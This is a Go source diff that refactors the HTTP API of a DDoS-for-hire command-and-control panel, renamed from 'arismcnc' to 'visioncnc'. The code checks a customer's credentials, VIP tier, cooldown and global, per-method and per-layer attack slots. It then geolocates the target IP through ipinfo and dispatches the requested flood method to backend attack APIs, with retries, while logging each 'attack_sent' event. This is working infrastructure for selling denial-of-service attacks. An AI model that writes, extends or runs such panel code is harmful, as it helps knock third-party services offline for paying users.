@@ -1,25 +1,29 @@
 package managers
 
 import (
-	"arismcnc/database"
-	"arismcnc/utils"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
-	"net"
 	"net/http"
-	"os"
-	"regexp"
 	"strconv"
-	"strings"
 	"sync"
 	"time"
+	"visioncnc/database"
+	"visioncnc/utils"
 )
+
+// Global per-user mutex map to serialize attack processing per user
+var userLocks sync.Map
+
+func getUserLock(username string) *sync.Mutex {
+	lock, _ := userLocks.LoadOrStore(username, &sync.Mutex{})
+	return lock.(*sync.Mutex)
+}
 
 func CheckVIPStatus(license, method string, db *database.Database) (bool, error) {
 	userInfo := db.GetAccountInfo(license)
-	methodConfig, err := getMethodConfig(method)
+	methodConfig, err := utils.GetMethodConfig(method)
 	if err != nil || methodConfig == nil {
 		return false, nil
 	}
@@ -31,7 +35,7 @@ func CheckVIPStatus(license, method string, db *database.Database) (bool, error)
 
 func CheckPrivateStatus(license, method string, db *database.Database) (bool, error) {
 	userInfo := db.GetAccountInfo(license)
-	methodConfig, err := getMethodConfig(method)
+	methodConfig, err := utils.GetMethodConfig(method)
 	if err != nil || methodConfig == nil {
 		return false, nil
 	}
@@ -41,19 +45,9 @@ func CheckPrivateStatus(license, method string, db *database.Database) (bool, er
 	return true, nil
 }
 
-// Global map of user locks
-var userLocks sync.Map
-
-func getUserLock(username string) *sync.Mutex {
-	// Get or create a mutex for the user
-	lock, _ := userLocks.LoadOrStore(username, &sync.Mutex{})
-	return lock.(*sync.Mutex)
-}
-
-func processAttack(username, password, target, port, timeStr, method string, db *database.Database, config *utils.Config) (map[string]string, error) {
+func processAttack(username, password, target, port, timeStr, methodName string, db *database.Database, config *utils.Config) (map[string]string, error) {
 	user := db.GetAccountInfo(username)
 
-	// Ensure only one request is processed at a time for the user
 	userLock := getUserLock(username)
 	userLock.Lock()
 	defer userLock.Unlock()
@@ -68,17 +62,29 @@ func processAttack(username, password, target, port, timeStr, method string, db 
 		return nil, fmt.Errorf("Attacks are disabled.")
 	}
 
-	methodConfig, err := getMethodConfig(method)
+	methodConfig, err := utils.GetMethodConfig(methodName)
 	if err != nil || methodConfig == nil {
 		return nil, fmt.Errorf("Method not found.")
 	}
-	if !isValidTarget(target) {
+	if !utils.IsValidTarget(target) {
 		return nil, fmt.Errorf("Invalid target format.")
 	}
 
-	currentAttacks := db.GetCurrentAttacksLength()
-	if currentAttacks > config.Global_slots {
+	// Global slots
+	if db.GetCurrentAttacksLength() > config.Global_slots {
 		return nil, fmt.Errorf("global network slots (%d) are currently in use", config.Global_slots)
+	}
+
+	// Per-method slots
+	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
+		return nil, fmt.Errorf("all slots of method '%s' (%d) are currently in use", methodConfig.Method, methodConfig.Slots)
+	}
+
+	// Per-layer slots
+	if limit, ok := config.Layer_slots[methodConfig.Group]; ok && limit > 0 {
+		if db.GetCurrentAttacksLengthByGroup(methodConfig.Group) >= limit {
+			return nil, fmt.Errorf("%s layer slots (%d) are currently in use", methodConfig.Group, limit)
+		}
 	}
 
 	if cooldown := db.HowLongOnCooldown(username, user.Cooldown); cooldown > 0 {
@@ -99,13 +105,17 @@ func processAttack(username, password, target, port, timeStr, method string, db 
 		return nil, fmt.Errorf("Spam protection active. Please wait.")
 	}
 	if user.BypassBlacklist != 1 {
-		if blocked, err := isTargetBlocked(target); blocked || err != nil {
-			lm, err := NewLogManager("./assets/logs/logs.json")
-			if err != nil {
-				log.Printf("Error initializing LogManager: %v", err)
-			} else {
-				defer lm.Close()
-				lm.Log("User tried to attack blocked target (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
+		if isFunnelTargetBlocked(target) {
+			lm := GetSharedLogManager()
+			if lm != nil {
+				lm.LogEvent("blacklist_blocked", map[string]string{
+					"source":   "API",
+					"username": username,
+					"target":   target,
+					"port":     port,
+					"time":     timeStr,
+					"method":   methodName,
+				})
 			}
 			return nil, fmt.Errorf("Target is blocked.")
 		}
@@ -119,73 +129,76 @@ func processAttack(username, password, target, port, timeStr, method string, db 
 		return nil, fmt.Errorf("Your max attack time is %d.", user.Maxtime)
 	}
 
-	if valid, err := CheckVIPStatus(username, method, db); !valid || err != nil {
+	if valid, _ := CheckVIPStatus(username, methodName, db); !valid {
 		return nil, fmt.Errorf("VIP access required for this method.")
 	}
-	if valid, err := CheckPrivateStatus(username, method, db); !valid || err != nil {
+	if valid, _ := CheckPrivateStatus(username, methodName, db); !valid {
 		return nil, fmt.Errorf("PRIVATE access required for this method.")
 	}
 
-	asnInfo := fetchASNInfo(target)
-	lm, err := NewLogManager("./assets/logs/logs.json")
-	if err != nil {
-		log.Printf("Error initializing LogManager: %v", err)
-	} else {
-		defer lm.Close()
-		lm.Log("New Attack (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
-	}
-	db.LogAttack(username, target, port, parseTime(timeStr), method)
+	asnInfo := fetchASNInfoFunnel(target, config)
 
-	// Send immediate response
+	// Log attack event
+	lm := GetSharedLogManager()
+	if lm != nil {
+		lm.LogEvent("attack_sent", map[string]string{
+			"source":   "API",
+			"username": username,
+			"target":   target,
+			"port":     port,
+			"time":     timeStr,
+			"method":   methodName,
+			"layer":    methodConfig.Group,
+			"country":  asnInfo.Country,
+			"org":      asnInfo.Org,
+			"region":   asnInfo.Region,
+		})
+	}
+	db.LogAttack(username, target, port, timeInt, methodName)
+
 	response := map[string]string{
-		"\nerror":                "false",
-		"\nmessage":              "Attack Sent",
-		"\ntarget":               target,
-		"\nmethod":               method,
-		"\ntarget_country":       asnInfo.Country,
-		"\ntarget_region":        asnInfo.Region,
-		"\ntarget_org":           asnInfo.Org,
-		"\nyour_running_attacks": fmt.Sprintf("%d/%d", db.GetUserCurrentAttacksCount(username), user.Concurrents),
+		"error":                "false",
+		"message":              "Attack Sent",
+		"target":               target,
+		"method":               methodName,
+		"target_country":       asnInfo.Country,
+		"target_region":        asnInfo.Region,
+		"target_org":           asnInfo.Org,
+		"your_running_attacks": fmt.Sprintf("%d/%d", db.GetUserCurrentAttacksCount(username), user.Concurrents),
 	}
 
-	// Process further actions in the background
+	// Dispatch API requests in background
+	selected := utils.SelectAPIs(methodName, methodConfig.ApiMode, methodConfig.API)
+	timeout := 2 * time.Second
+	if methodConfig.ApiTimeout > 0 {
+		timeout = time.Duration(methodConfig.ApiTimeout) * time.Second
+	}
+
 	go func() {
-		responses := make(chan string, len(methodConfig.API)) // Channel for goroutine synchronization
-		var wg sync.WaitGroup                                 // WaitGroup to monitor goroutines
-
-		for _, api := range methodConfig.API {
-			fullURL := replacePlaceholdersFunnel(api, username, password, target, port, timeStr, method)
-
-			wg.Add(1) // Add to WaitGroup counter
-			go func(link string) {
-				defer wg.Done() // Decrease WaitGroup counter when goroutine finishes
-				res, err := http.Get(link)
-				if err != nil {
-					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
-					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
-					return
+		client := &http.Client{Timeout: timeout}
+		var wg sync.WaitGroup
+		for _, entry := range selected {
+			fullURL := utils.ReplacePlaceholdersFunnel(entry.URL, username, password, target, port, timeStr, methodName)
+			wg.Add(1)
+			go func(url, label string) {
+				defer wg.Done()
+				maxAttempts := 1 + methodConfig.ApiRetry
+				for attempt := 0; attempt < maxAttempts; attempt++ {
+					res, err := client.Get(url)
+					if err != nil {
+						utils.RecordAPIError(url, label)
+						log.Printf("[ATTACK] Error on %s (attempt %d): %v", label, attempt+1, err)
+						continue
+					}
+					io.Copy(io.Discard, res.Body)
+					res.Body.Close()
+					utils.RecordAPISuccess(url, label)
+					log.Printf("[ATTACK] %s → sent (HTTP %d)", label, res.StatusCode)
+					break
 				}
-				defer res.Body.Close()
-
-				body, err := io.ReadAll(res.Body)
-				if err != nil {
-					log.Printf("[ATTACK] Error reading response from: %s - %v", link, err)
-					responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
-					return
-				}
-
-				log.Printf("[ATTACK] Sending request to: %s", link)
-				responses <- fmt.Sprintf("[ATTACK] %s response: %s", link, string(body))
-			}(fullURL)
+			}(fullURL, entry.Label)
 		}
-
-		// Wait for all goroutines to finish
 		wg.Wait()
-		close(responses)
-
-		for resp := range responses {
-			log.Println(resp)
-		}
 	}()
 
 	return response, nil
@@ -198,8 +211,12 @@ func FunnelCreate(w http.ResponseWriter, r *http.Request, db *database.Database,
 	}
 
 	params := r.URL.Query()
-	username, password := params.Get("username"), params.Get("password")
-	target, port, timeStr, method := params.Get("target"), params.Get("port"), params.Get("time"), params.Get("method")
+	username := params.Get("username")
+	password := params.Get("password")
+	target := params.Get("target")
+	port := params.Get("port")
+	timeStr := params.Get("time")
+	method := params.Get("method")
 
 	if username == "" || password == "" || target == "" || port == "" || timeStr == "" || method == "" {
 		respondWithJSON(w, true, "Missing required parameters.")
@@ -219,22 +236,21 @@ func FunnelCreate(w http.ResponseWriter, r *http.Request, db *database.Database,
 	respondWithJSON(w, false, response)
 }
 
-// fetchASNInfo retrieves country/org/region for a target IP
-func fetchASNInfo(target string) (asnInfo struct{ Country, Org, Region string }) {
-	config, _ := utils.LoadConfig("assets/config.json")
-	token := "YOUR_IPINFO_TOKEN"
+// fetchASNInfoFunnel retrieves country/org/region for a target IP
+func fetchASNInfoFunnel(target string, config *utils.Config) struct{ Country, Org, Region string } {
+	var result struct{ Country, Org, Region string }
+	apiURL := "https://ipinfo.io/" + target + "/json"
 	if config != nil && config.IpinfoToken != "" {
-		token = config.IpinfoToken
+		apiURL += "?token=" + config.IpinfoToken
 	}
 	client := &http.Client{Timeout: 3 * time.Second}
-	resp, err := client.Get("https://ipinfo.io/" + target + "/json?token=" + token)
+	resp, err := client.Get(apiURL)
 	if err != nil {
-		log.Printf("Error fetching ASN info: %s", err)
-		return
+		return result
 	}
 	defer resp.Body.Close()
-	json.NewDecoder(resp.Body).Decode(&asnInfo)
-	return
+	json.NewDecoder(resp.Body).Decode(&result)
+	return result
 }
 
 func respondWithJSON(w http.ResponseWriter, isError bool, message interface{}) {
@@ -245,80 +261,8 @@ func respondWithJSON(w http.ResponseWriter, isError bool, message interface{}) {
 	})
 }
 
-func getMethodConfig(method string) (*utils.Method, error) {
-	return utils.GetMethodConfig(method)
-}
-
-func parseTime(timeStr string) int {
-	timeInt, err := strconv.Atoi(timeStr)
-	if err != nil {
-		log.Printf("Error parsing time: %s", err)
-		return 0
-	}
-	return timeInt
-}
-
-func replacePlaceholdersFunnel(url, username, password, target, port, time, method string) string {
-	replacements := map[string]string{
-		"<<$host>>":   target,
-		"<<$port>>":   port,
-		"<<$time>>":   time,
-		"<<$method>>": method,
-	}
-	for placeholder, value := range replacements {
-		url = strings.ReplaceAll(url, placeholder, value)
-	}
-	return url
-}
-
-func sendRequest(url string) error {
-	client := &http.Client{}
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		return fmt.Errorf("failed to create request: %w", err)
-	}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Printf("Error sending request to %s: %s", url, err)
-		return nil
-	}
-	defer resp.Body.Close()
-	log.Printf("Request sent to %s, status code: %d", url, resp.StatusCode)
-	return nil
-}
-
-func isTargetBlocked(target string) (bool, error) {
-	blockedIPs, err := readBlacklistedIPs("assets/blacklists/list.json")
-	if err != nil {
-		return false, err
-	}
-	for _, blockedIP := range blockedIPs {
-		if target == blockedIP || (strings.HasSuffix(blockedIP, ".gov") && strings.HasSuffix(target, ".gov")) {
-			return true, nil
-		}
-	}
-	return false, nil
-}
-
-func readBlacklistedIPs(filename string) ([]string, error) {
-	file, err := os.Open(filename)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
-
-	var ips []string
-	if err := json.NewDecoder(file).Decode(&ips); err != nil {
-		return nil, err
-	}
-	return ips, nil
-}
-
-func isValidTarget(target string) bool {
-	if net.ParseIP(target) != nil {
-		return true
-	}
-	regex := `^(http://|https://|www\.).+`
-	matched, _ := regexp.MatchString(regex, target)
-	return matched
+// isFunnelTargetBlocked checks if a target is in the blacklist (supports CIDR ranges).
+func isFunnelTargetBlocked(target string) bool {
+	blockedIPs := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
+	return utils.IsTargetBlocked(target, blockedIPs)
 }
